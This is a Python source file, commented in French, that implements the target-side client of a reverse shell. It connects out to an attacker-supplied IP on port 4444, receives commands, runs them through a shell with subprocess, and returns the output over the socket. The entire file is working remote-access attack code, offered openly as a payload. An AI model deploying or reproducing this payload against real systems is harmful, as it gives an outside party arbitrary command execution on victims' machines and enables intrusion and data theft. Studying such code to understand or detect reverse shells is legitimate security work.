"""
Reverse Shell Payload Module
Client exécuté sur le système cible
"""

import socket
import subprocess
import os
import platform
from typing import Optional


class ReverseShellPayload:
    """
    Payload (Client) : Côté Système Cible
    Se connecte au handler et exécute les commandes reçues
    """

    def __init__(self, attaquant_ip: str, attaquant_port: int = 4444):
        """
        Initialise le payload

        Args:
            attaquant_ip: IP du handler/attaquant
            attaquant_port: Port du handler (défaut: 4444)
        """
        self.attaquant_ip = attaquant_ip
        self.attaquant_port = attaquant_port
        self.socket: Optional[socket.socket] = None

    def connecter(self) -> bool:
        """
        Établit la connexion vers le handler

        Returns:
            True si succès, False sinon
        """
        try:
            # Créer socket client
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connecter vers handler
            self.socket.connect((self.attaquant_ip, self.attaquant_port))

            print(f"[PAYLOAD] Connecté à {self.attaquant_ip}:{self.attaquant_port}")
            return True

        except Exception as e:
            print(f"[ERREUR PAYLOAD] Impossible de se connecter: {e}")
            return False

    def executer_commande(self, commande: str) -> str:
        """
        Exécute une commande et retourne l'output

        Args:
            commande: Commande à exécuter

        Returns:
            Sortie standard + erreurs
        """
        try:
            # Exécuter commande
            process = subprocess.Popen(
                commande,
                shell=True,                    # Utiliser le shell
                stdout=subprocess.PIPE,        # Capturer stdout
                stderr=subprocess.STDOUT,      # Rediriger stderr vers stdout
                text=True,                     # Mode texte
                cwd=os.getcwd()                # Répertoire courant
            )

            # Communiquer et timeout 30s
            try:
                stdout, _ = process.communicate(timeout=30)
                return stdout

            except subprocess.TimeoutExpired:
                process.kill()
                return "[TIMEOUT] Commande a dépassé 30 secondes\n"

        except Exception as e:
            return f"[ERREUR EXÉCUTION] {str(e)}\n"

    def boucle_reception(self):
        """
        Boucle de réception des commandes et exécution
        """
        if not self.socket:
            print("[ERREUR] Pas de connexion établie")
            return

        print(f"[PAYLOAD] Boucle de réception des commandes")
        print("-" * 70)

        try:
            while True:
                # Recevoir commande (bloque jusqu'à données)
                donnees = self.socket.recv(1024)

                # Vérifier déconnexion
                if not donnees:
                    print("[PAYLOAD] Handler déconnecté")
                    break

                # Décoder commande
                commande = donnees.decode('utf-8').strip()

                # Exécuter commande
                if commande:
                    resultats = self.executer_commande(commande)
                else:
                    resultats = ""

                # Envoyer résultats
                try:
                    self.socket.send(resultats.encode('utf-8'))
                except Exception as e:
                    print(f"[ERREUR] Impossible d'envoyer résultats: {e}")
                    break

        except KeyboardInterrupt:
            print("[PAYLOAD] Interruption")

        except Exception as e:
            print(f"[ERREUR PAYLOAD] {e}")

        finally:
            self.fermer()

    def fermer(self):
        """Ferme la connexion"""
        if self.socket:
            self.socket.close()
        print("[PAYLOAD] Connexion fermée")
